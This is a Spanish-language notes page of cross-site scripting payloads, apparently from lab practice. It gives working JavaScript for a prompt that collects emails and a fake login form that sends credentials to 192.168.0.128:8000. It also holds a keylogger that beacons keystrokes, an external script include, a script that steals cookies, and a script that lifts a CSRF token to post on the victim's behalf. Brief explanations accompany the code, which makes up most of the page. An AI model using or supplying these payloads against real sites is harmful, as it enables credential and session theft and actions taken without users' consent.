
____

- Tags: 

___
# Introducción

**XSS (Cross-Site Scripting)** es una vulnerabilidad de seguridad que permite a los atacantes ejecutar scripts maliciosos en páginas web visualizadas por otros usuarios. Estos scripts pueden robar información confidencial, manipular el contenido de la página o realizar acciones en nombre del usuario afectado. A continuación, se presentan algunos ejemplos de scripts **XSS** comúnmente utilizados.

____
# Ejemplos de Scripts para XSS

### Ventana de Prompt para Obtener Correo Electrónico:

```js
<script>

  var email = prompt("Ingrese su correo electronico","example@example.com");

  if (email == null || email == ""){
      alert("Por favor, recarga la página");
  }else{
    fetch("http://192.168.0.128:8000/"+"?email="+email)

  }

</script>

```

Este script solicita al usuario su correo electrónico a través de una ventana emergente y envía la información a un servidor mediante una solicitud GET.

### Formulario de Inicio de Sesión Malicioso:

```js
  <script>
    document.addEventListener("DOMContentLoaded", function() {
      var formContainer = document.createElement("div");
      formContainer.innerHTML = `
        <form id="loginForm">
          <label for="email">Correo Electrónico:</label>
          <input type="email" id="email" name="email" required>
          
          <label for="password">Contraseña:</label>
          <input type="password" id="password" name="password" required>
          
          <button type="button" onclick="enviarFormulario()">Enviar</button>
        </form>
      `;

      document.body.appendChild(formContainer);
    });

    function enviarFormulario() {
      var email = document.getElementById("email").value;
      var password = document.getElementById("password").value;

      if (email === "" || password === "") {
        alert("Por favor, complete todos los campos.");
      } else {
        // Construir la URL con los parámetros
        var url = "http://192.168.0.128:8000/?email=" + email + "&password=" + password;

        // Realizar la solicitud GET
        fetch(url)
        .then(response => {
          if (response.ok) {
            alert("Inicio de sesión exitoso");
            // Puedes redirigir al usuario a otra página o realizar otras acciones necesarias
          } else {
            alert("Error al iniciar sesión");
          }
        })
        .catch(error => {
          console.error("Error de red:", error);
        });
      }
    }
  </script>
```

Este script agrega dinámicamente un formulario de inicio de sesión falso en la página y envía las credenciales a un servidor remoto.

### Keylogger:

```js

<script>

  var k = "";
  document.onkeypress = function(e){
    e = e || window.event;

    k+=e.key;
    var i = new Image();

    i.src = "http://192.168.0.128:8000/" + k;

  }


</script>

```


Este script registra todas las teclas presionadas por el usuario y las envía a un servidor remoto.

### Redirección Automática:

```js

<script>

window.location.href = 'https://www.ejemplo.com';

</script>


```

Este código en JavaScript se utiliza para redirigir automáticamente a la página web especificada. 

### Inclusión de Script Externo:

```html
<script src='http://anotherexample.org/script.js'></script>
```

Al inyectar este código en una página, se carga y ejecuta un script remoto que puede realizar acciones maliciosas, como se muestra a continuación:


```javascript
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.0.128:8000/?cookie=' + document.cookie);
request.send();
```

Este script envía la cookie de la víctima a un servidor remoto a través de una solicitud GET.

También podemos hacer que la víctima haga cosas, tal es el caso de crear un nuevo post en alguna web, pero para eso primero tenemos que hacer un post malicioso que, al momento en que la víctima entre, ejecute un script remoto que haga que esta cree un nuevo post personalizado por el atacante:

```html
<script src='http://anotherexample.org/script.js'></script>
```

Luego hacemos el script malicioso que hace que la víctima haga un post hecho por el atacante:

```javascript
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName('_csrf_token')[0].value;

var req2 = new XMLHttpRequest();
var data = "title=hola&subtitle=hola&text=hola&_csrf_token=" + token;
req2.open('POST', "http://localhost:10007/newgossip");
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

El código realiza dos solicitudes [[HTTP]] usando XMLHttpRequest. La primera solicitud (GET) obtiene un token CSRF de una página web y la segunda solicitud (POST) envía datos junto con ese token a otra URL.